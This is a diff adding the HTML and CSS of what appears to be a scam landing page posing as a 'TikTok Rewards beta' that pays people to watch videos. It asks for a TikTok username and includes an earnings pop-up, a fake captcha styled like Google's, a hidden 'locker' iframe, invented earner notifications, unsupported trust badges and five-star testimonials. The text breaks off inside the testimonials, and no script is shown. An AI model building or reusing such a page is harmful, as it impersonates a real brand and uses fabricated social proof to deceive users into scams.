@@ -1,0 +1,1201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title> - Activate Monetization</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+/* Augmenter la taille du logo + réduire l'espace sous le logo */
+.tiktok-logo {
+width: 140px;
+height: 140px;
+margin: 0 auto 16px;
+animation: pulse 2s ease-in-out infinite;
+}
+.tiktok-logo img {
+width: 100%;
+height: 100%;
+object-fit: contain;
+display: block;
+}
+/* Réduire l'espace global du hero pour resserrer le layout */
+.hero {
+min-height: 100vh;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+padding: 64px 24px;
+text-align: center;
+}
+/* Optionnel : réduire légèrement l'espace au-dessus du titre */
+.hero-content h1 {
+margin-top: 8px;
+}
+* {
+margin: 0;
+padding: 0;
+box-sizing: border-box;
+}
+:root {
+--primary: #000000;
+--background: #ffffff;
+--muted: #6b7280;
+--border: #e5e7eb;
+--card-bg: #f9fafb;
+--tiktok-pink: #fe2c55;
+--tiktok-cyan: #25f4ee;
+}
+html {
+scroll-behavior: smooth;
+}
+body {
+font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+background: var(--background);
+color: var(--primary);
+line-height: 1.6;
+overflow-x: hidden;
+}
+/* Animations */
+@keyframes fadeInUp {
+from {
+opacity: 0;
+transform: translateY(30px);
+}
+to {
+opacity: 1;
+transform: translateY(0);
+}
+}
+@keyframes fadeIn {
+from { opacity: 0; }
+to { opacity: 1; }
+}
+@keyframes pulse {
+0%, 100% { transform: scale(1); }
+50% { transform: scale(1.05); }
+}
+@keyframes scrollUp {
+0% { transform: translateY(0); }
+100% { transform: translateY(-50%); }
+}
+@keyframes countUp {
+from { opacity: 0; transform: translateY(10px); }
+to { opacity: 1; transform: translateY(0); }
+}
+.animate-fade-in-up {
+animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+opacity: 0;
+}
+.animate-fade-in {
+animation: fadeIn 0.5s ease forwards;
+opacity: 0;
+}
+.delay-100 { animation-delay: 0.1s; }
+.delay-200 { animation-delay: 0.2s; }
+.delay-300 { animation-delay: 0.3s; }
+.delay-400 { animation-delay: 0.4s; }
+/* Layout */
+.container {
+max-width: 1200px;
+margin: 0 auto;
+padding: 0 24px;
+}
+/* Sidebar */
+.sidebar {
+position: fixed;
+left: 16px;
+top: 50%;
+transform: translateY(-50%);
+width: 280px;
+background: rgba(255, 255, 255, 0.95);
+backdrop-filter: blur(10px);
+border-radius: 16px;
+box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+border: 1px solid var(--border);
+padding: 16px;
+z-index: 40;
+display: none;
+}
+@media (min-width: 1024px) {
+.sidebar {
+display: block;
+}
+.main-content {
+margin-left: 312px;
+}
+}
+.sidebar-content {
+height: 500px;
+overflow: hidden;
+position: relative;
+}
+.scroll-container {
+animation: scrollUp 25s linear infinite;
+}
+.scroll-container:hover {
+animation-play-state: paused;
+}
+/* Notification Card */
+.notification-card {
+display: flex;
+align-items: center;
+gap: 12px;
+padding: 12px;
+border-radius: 12px;
+background: rgba(255, 255, 255, 0.8);
+border: 1px solid var(--border);
+margin-bottom: 12px;
+box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+}
+.notification-avatar {
+width: 40px;
+height: 40px;
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+color: white;
+font-weight: 700;
+font-size: 14px;
+flex-shrink: 0;
+}
+.notification-text {
+flex: 1;
+min-width: 0;
+}
+.notification-name {
+font-weight: 600;
+font-size: 14px;
+color: var(--primary);
+white-space: nowrap;
+overflow: hidden;
+text-overflow: ellipsis;
+}
+.notification-amount {
+font-size: 12px;
+color: var(--muted);
+}
+.notification-amount span {
+color: #10b981;
+font-weight: 600;
+}
+/* Hero Section */
+.hero-content {
+max-width: 600px;
+}
+/* Typography */
+h1 {
+font-size: clamp(28px, 5vw, 48px);
+font-weight: 700;
+line-height: 1.1;
+margin-bottom: 16px;
+letter-spacing: -0.02em;
+}
+h2 {
+font-size: clamp(24px, 4vw, 32px);
+font-weight: 700;
+margin-bottom: 16px;
+letter-spacing: -0.01em;
+}
+.subtitle {
+font-size: 18px;
+color: var(--muted);
+margin-bottom: 32px;
+}
+/* Form */
+.form-group {
+text-align: left;
+margin-bottom: 16px;
+}
+.form-label {
+display: block;
+font-size: 14px;
+font-weight: 500;
+color: #374151;
+margin-bottom: 8px;
+}
+.form-input {
+width: 100%;
+height: 56px;
+padding: 0 16px;
+border: 2px solid var(--border);
+border-radius: 12px;
+font-size: 16px;
+transition: all 0.2s ease;
+background: white;
+}
+.form-input:focus {
+outline: none;
+border-color: var(--primary);
+box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.1);
+}
+.form-input::placeholder {
+color: #9ca3af;
+}
+/* Button */
+.btn {
+display: inline-flex;
+align-items: center;
+justify-content: center;
+height: 56px;
+padding: 0 32px;
+background: var(--primary);
+color: white;
+border: none;
+border-radius: 9999px;
+font-size: 16px;
+font-weight: 600;
+cursor: pointer;
+transition: all 0.2s ease;
+width: 100%;
+}
+.btn:hover {
+transform: scale(1.02);
+box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+}
+.btn:active {
+transform: scale(0.98);
+}
+/* Trust Badges */
+.trust-badges {
+display: flex;
+flex-wrap: wrap;
+justify-content: center;
+gap: 24px;
+margin-top: 32px;
+}
+.trust-badge {
+display: flex;
+align-items: center;
+gap: 8px;
+font-size: 14px;
+color: var(--muted);
+}
+.trust-badge-icon {
+font-size: 18px;
+}
+/* Section */
+.section {
+padding: 96px 24px;
+}
+.section-gray {
+background: var(--card-bg);
+}
+.section-header {
+text-align: center;
+margin-bottom: 64px;
+}
+/* Step Cards */
+.steps-grid {
+display: grid;
+grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+gap: 32px;
+max-width: 1000px;
+margin: 0 auto;
+}
+.step-card {
+position: relative;
+padding: 32px;
+background: white;
+border-radius: 24px;
+border: 1px solid var(--border);
+box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+transition: all 0.3s ease;
+}
+.step-card:hover {
+transform: translateY(-4px);
+box-shadow: 0 12px 32px rgba(0, 0, 0, 0.1);
+}
+.step-number {
+position: absolute;
+top: -16px;
+left: 24px;
+width: 40px;
+height: 40px;
+background: var(--primary);
+color: white;
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+font-weight: 700;
+font-size: 18px;
+}
+.step-title {
+font-size: 20px;
+font-weight: 700;
+margin: 16px 0 12px;
+}
+.step-description {
+color: var(--muted);
+line-height: 1.6;
+}
+/* Testimonials */
+.testimonials-grid {
+display: grid;
+grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+gap: 24px;
+max-width: 1000px;
+margin: 0 auto;
+}
+.testimonial-card {
+padding: 24px;
+background: white;
+border-radius: 16px;
+border: 1px solid var(--border);
+box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+transition: all 0.3s ease;
+}
+.testimonial-card:hover {
+transform: scale(1.01);
+box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+}
+.testimonial-header {
+display: flex;
+align-items: center;
+gap: 12px;
+margin-bottom: 16px;
+}
+.testimonial-avatar {
+width: 48px;
+height: 48px;
+border-radius: 50%;
+overflow: hidden;
+}
+.testimonial-avatar img {
+width: 100%;
+height: 100%;
+object-fit: cover;
+}
+.testimonial-name {
+font-weight: 600;
+color: var(--primary);
+}
+.testimonial-stars {
+display: flex;
+gap: 2px;
+}
+.star {
+width: 16px;
+height: 16px;
+color: #fbbf24;
+fill: #fbbf24;
+}
+.testimonial-quote {
+color: var(--muted);
+font-style: italic;
+line-height: 1.6;
+}
+/* Footer */
+.footer {
+padding: 48px 24px;
+background: var(--card-bg);
+border-top: 1px solid var(--border);
+text-align: center;
+}
+.footer-text {
+font-size: 14px;
+color: var(--muted);
+margin-bottom: 24px;
+}
+.footer-links {
+display: flex;
+flex-wrap: wrap;
+justify-content: center;
+gap: 16px;
+}
+.footer-link {
+font-size: 14px;
+color: var(--muted);
+text-decoration: none;
+transition: color 0.2s ease;
+}
+.footer-link:hover {
+color: var(--primary);
+text-decoration: underline;
+}
+.footer-separator {
+color: #d1d5db;
+}
+/* Modal */
+.modal-overlay {
+position: fixed;
+inset: 0;
+background: rgba(0, 0, 0, 0.5);
+backdrop-filter: blur(4px);
+display: flex;
+align-items: center;
+justify-content: center;
+z-index: 100;
+opacity: 0;
+visibility: hidden;
+transition: all 0.3s ease;
+}
+.modal-overlay.active {
+opacity: 1;
+visibility: visible;
+}
+.modal-content {
+background: white;
+border-radius: 24px;
+padding: 40px;
+max-width: 420px;
+width: 90%;
+text-align: center;
+transform: scale(0.9) translateY(20px);
+transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+position: relative;
+}
+.modal-overlay.active .modal-content {
+transform: scale(1) translateY(0);
+}
+.modal-close {
+position: absolute;
+top: 16px;
+right: 16px;
+width: 36px;
+height: 36px;
+border-radius: 50%;
+border: none;
+background: transparent;
+cursor: pointer;
+display: flex;
+align-items: center;
+justify-content: center;
+transition: all 0.2s ease;
+}
+.modal-close:hover {
+background: rgba(0, 0, 0, 0.05);
+transform: rotate(90deg);
+}
+.modal-title {
+font-size: 20px;
+font-weight: 700;
+margin-bottom: 24px;
+}
+.modal-amount {
+font-size: 64px;
+font-weight: 800;
+color: #10b981;
+margin-bottom: 16px;
+animation: countUp 0.6s ease forwards;
+}
+.modal-disclaimer {
+font-size: 14px;
+color: var(--muted);
+margin-bottom: 24px;
+}
+/* Captcha Modal */
+.captcha-overlay {
+position: fixed;
+inset: 0;
+background: rgba(0, 0, 0, 0.6);
+backdrop-filter: blur(8px);
+display: flex;
+align-items: center;
+justify-content: center;
+z-index: 200;
+opacity: 0;
+visibility: hidden;
+transition: all 0.3s ease;
+}
+.captcha-overlay.active {
+opacity: 1;
+visibility: visible;
+}
+.captcha-content {
+background: white;
+border-radius: 16px;
+padding: 32px;
+max-width: 480px;
+width: 90%;
+position: relative;
+transform: scale(0.95);
+transition: transform 0.3s ease;
+}
+.captcha-overlay.active .captcha-content {
+transform: scale(1);
+}
+.captcha-close {
+position: absolute;
+top: 16px;
+right: 16px;
+width: 32px;
+height: 32px;
+border: none;
+background: transparent;
+cursor: pointer;
+font-size: 24px;
+color: #6b7280;
+display: flex;
+align-items: center;
+justify-content: center;
+border-radius: 50%;
+transition: all 0.2s;
+}
+.captcha-close:hover {
+background: rgba(0,0,0,0.05);
+color: #000;
+}
+.captcha-title {
+font-size: 18px;
+font-weight: 600;
+margin-bottom: 24px;
+padding-right: 40px;
+line-height: 1.4;
+}
+.captcha-box {
+border: 1px solid #d1d5db;
+border-radius: 8px;
+padding: 16px;
+display: flex;
+align-items: center;
+gap: 12px;
+background: #f9fafb;
+margin-bottom: 16px;
+cursor: pointer;
+}
+.captcha-checkbox {
+width: 28px;
+height: 28px;
+border: 2px solid #c1c1c1;
+border-radius: 4px;
+background: white;
+display: flex;
+align-items: center;
+justify-content: center;
+transition: all 0.2s;
+flex-shrink: 0;
+}
+.captcha-checkbox.checked {
+background: #10b981;
+border-color: #10b981;
+}
+.captcha-checkbox.checked::after {
+content: "✓";
+color: white;
+font-size: 18px;
+font-weight: bold;
+}
+.captcha-label {
+font-size: 16px;
+color: #374151;
+user-select: none;
+}
+.captcha-brand {
+margin-left: auto;
+display: flex;
+flex-direction: column;
+align-items: center;
+gap: 4px;
+}
+.captcha-logo {
+width: 40px;
+height: 40px;
+background: linear-gradient(135deg, #4285f4 0%, #34a853 50%, #fbbc04 100%);
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+position: relative;
+}
+.captcha-logo::before {
+content: "";
+position: absolute;
+width: 20px;
+height: 20px;
+border: 3px solid white;
+border-radius: 50%;
+border-top-color: transparent;
+animation: spin 1s linear infinite;
+}
+@keyframes spin {
+to { transform: rotate(360deg); }
+}
+.captcha-logo-text {
+font-size: 10px;
+color: #6b7280;
+font-weight: 500;
+}
+.captcha-links {
+display: flex;
+gap: 12px;
+justify-content: flex-end;
+font-size: 11px;
+}
+.captcha-links a {
+color: #6b7280;
+text-decoration: none;
+}
+/* Scroll reveal */
+.reveal {
+opacity: 0;
+transform: translateY(40px);
+transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+}
+.reveal.active {
+opacity: 1;
+transform: translateY(0);
+}
+/* Arrow icon */
+.arrow-icon {
+display: inline-flex;
+margin-left: 8px;
+}
+/* Bottom Left Floating Notifications */
+.bottom-notifications {
+position: fixed;
+left: 16px;
+bottom: 16px;
+width: 320px;
+z-index: 50;
+display: block;
+}
+@media (min-width: 1024px) {
+.bottom-notifications {
+display: block;
+}
+}
+.bottom-notification-card {
+background: white;
+border-radius: 16px;
+padding: 16px 20px;
+margin-bottom: 12px;
+box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
+border: 1px solid var(--border);
+animation: slideInLeft 0.5s ease forwards;
+}
+@keyframes slideInLeft {
+from {
+opacity: 0;
+transform: translateX(-50px);
+}
+to {
+opacity: 1;
+transform: translateX(0);
+}
+}
+.bottom-notification-name {
+font-weight: 600;
+font-size: 15px;
+color: var(--primary);
+margin-bottom: 4px;
+}
+.bottom-notification-text {
+font-size: 14px;
+color: var(--muted);
+}
+.bottom-notification-text span {
+color: #10b981;
+font-weight: 600;
+}
+/* Earnings Card */
+.earnings-card {
+background: var(--card-bg);
+border-radius: 24px;
+padding: 48px;
+max-width: 700px;
+margin: 0 auto;
+text-align: center;
+}
+.earnings-card-header {
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 12px;
+margin-bottom: 32px;
+}
+.earnings-card-icon {
+width: 28px;
+height: 28px;
+color: #10b981;
+}
+.earnings-card-title {
+font-size: 22px;
+font-weight: 700;
+color: var(--primary);
+}
+.earnings-card-amount {
+font-size: 80px;
+font-weight: 800;
+color: var(--primary);
+line-height: 1;
+margin-bottom: 12px;
+}
+.earnings-card-subtitle {
+font-size: 15px;
+color: var(--muted);
+margin-bottom: 40px;
+}
+.earnings-card-stats {
+display: grid;
+grid-template-columns: repeat(3, 1fr);
+gap: 24px;
+padding-top: 32px;
+border-top: 1px solid var(--border);
+}
+.earnings-card-stat {
+text-align: center;
+}
+.earnings-card-stat-value {
+font-size: 36px;
+font-weight: 700;
+color: var(--primary);
+margin-bottom: 4px;
+}
+.earnings-card-stat-label {
+font-size: 14px;
+color: var(--muted);
+}
+@media (max-width: 640px) {
+.earnings-card {
+padding: 32px 24px;
+}
+.earnings-card-amount {
+font-size: 56px;
+}
+.earnings-card-stats {
+grid-template-columns: 1fr;
+gap: 16px;
+}
+}
+/* Iframe Container */
+#iframeContainer {
+display: none;
+width: 100%;
+max-width: 800px;
+margin: 40px auto 0;
+background: white;
+border-radius: 12px;
+overflow: hidden;
+box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+}
+#lockerIframe {
+width: 100%;
+height: 600px;
+border: none;
+}
+</style>
+</head>
+<body>
+<!-- Sidebar -->
+<aside class="sidebar animate-fade-in delay-500">
+<div class="sidebar-content">
+<div class="scroll-container" id="notificationScroll">
+<!-- Notifications will be duplicated by JS -->
+</div>
+</div>
+</aside>
+<!-- Bottom Left Floating Notifications -->
+<div class="bottom-notifications" id="bottomNotifications">
+<!-- Notifications will be added by JS -->
+</div>
+<!-- Main Content -->
+<main class="main-content">
+<!-- Hero Section -->
+<section class="hero">
+<div class="hero-content">
+<!-- TikTok Logo (Image) -->
+<div class="tiktok-logo animate-fade-in-up">
+<img src="https://tokactiv.com/assets/tiktok-logo-mIuVRUT4.png" alt="TikTok">
+</div>
+<!-- Headline -->
+<h1 class="animate-fade-in-up delay-100">
+Complete the steps to start earning money with your TikTok videos
+</h1>
+<!-- Subheadline -->
+<p class="subtitle animate-fade-in-up delay-200">
+Join the TikTok Rewards beta and get paid for every short video you watch.
+</p>
+<!-- Form -->
+<form class="animate-fade-in-up delay-300" id="earningsForm">
+<div class="form-group">
+<label class="form-label">Enter your TikTok username @</label>
+<input type="text" class="form-input" placeholder="@yourusername" id="usernameInput" required>
+</div>
+<button type="submit" class="btn">Check Earnings</button>
+</form>
+<!-- Iframe Container (hidden by default) -->
+<div id="iframeContainer">
+<iframe id="lockerIframe" src="" ></iframe>
+</div>
+<!-- Trust Badges -->
+<div class="trust-badges animate-fade-in-up delay-400">
+<div class="trust-badge">
+<span class="trust-badge-icon">⚡</span>
+<span>No download required</span>
+</div>
+<div class="trust-badge">
+<span class="trust-badge-icon">🔒</span>
+<span>Secure & verified program</span>
+</div>
+<div class="trust-badge">
+<span class="trust-badge-icon">👥</span>
+<span>15,000+ active earners</span>
+</div>
+</div>
+</div>
+</section>
+<!-- Quick Start Section -->
+<section class="section">
+<div class="container">
+<div class="section-header reveal">
+<h2>Quick Start Guide <span class="arrow-icon">→</span></h2>
+</div>
+<div class="steps-grid">
+<div class="step-card reveal">
+<div class="step-number">1</div>
+<h3 class="step-title">Create Your Account</h3>
+<p class="step-description">Enter your email address to join the TikTok Rewards beta.</p>
+</div>
+<div class="step-card reveal" style="transition-delay: 0.15s;">
+<div class="step-number">2</div>
+<h3 class="step-title">Watch & Earn</h3>
+<p class="step-description">Watch short TikTok clips daily — each completed view adds to your balance.</p>
+</div>
+<div class="step-card reveal" style="transition-delay: 0.3s;">
+<div class="step-number">3</div>
+<h3 class="step-title">Cash Out Earnings</h3>
+<p class="step-description">Get instant payouts via PayPal, CashApp, or direct bank transfer.</p>
+</div>
+</div>
+</div>
+</section>
+<!-- Testimonials Section -->
+<section class="section section-gray">
+<div class="container">
+<div class="section-header reveal">
+<h2>What Our Users Say</h2>
+</div>
+<div class="testimonials-grid">
+<div class="testimonial-card reveal">
+<div class="testimonial-header">
+<div class="testimonial-avatar">
+<img src="assets/avatar-jp.png" alt="Jordan P.">
+</div>
+<div>
+<div class="testimonial-name">Jordan P.</div>
+<div class="testimonial-stars">
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+</div>
+</div>
+</div>
+<p class="testimonial-quote">"I didn't believe it was real at first, but after my first payout I was hooked!"</p>
+</div>
+<div class="testimonial-card reveal" style="transition-delay: 0.1s;">
+<div class="testimonial-header">
+<div class="testimonial-avatar">
+<img src="assets/avatar-ml.png" alt="Mia L.">
+</div>
+<div>
+<div class="testimonial-name">Mia L.</div>
+<div class="testimonial-stars">
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+</div>
+</div>
+</div>
+<p class="testimonial-quote">"Legit platform. Payouts are fast and the process is super simple."</p>
+</div>
+<div class="testimonial-card reveal" style="transition-delay: 0.2s;">
+<div class="testimonial-header">
+<div class="testimonial-avatar">
+<img src="assets/avatar-cd.png" alt="Chris D.">
+</div>
+<div>
+<div class="testimonial-name">Chris D.</div>
+<div class="testimonial-stars">
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+</div>
+</div>
+</div>
+<p class="testimonial-quote">"I literally make money scrolling through TikTok. Couldn't ask for more!"</p>
+</div>
+<div class="testimonial-card reveal" style="transition-delay: 0.3s;">
+<div class="testimonial-header">
+<div class="testimonial-avatar">
+<img src="assets/avatar-er.png" alt="Emma R.">
+</div>
+<div>
+<div class="testimonial-name">Emma R.</div>
+<div class="testimonial-stars">
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
+<svg class="star" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
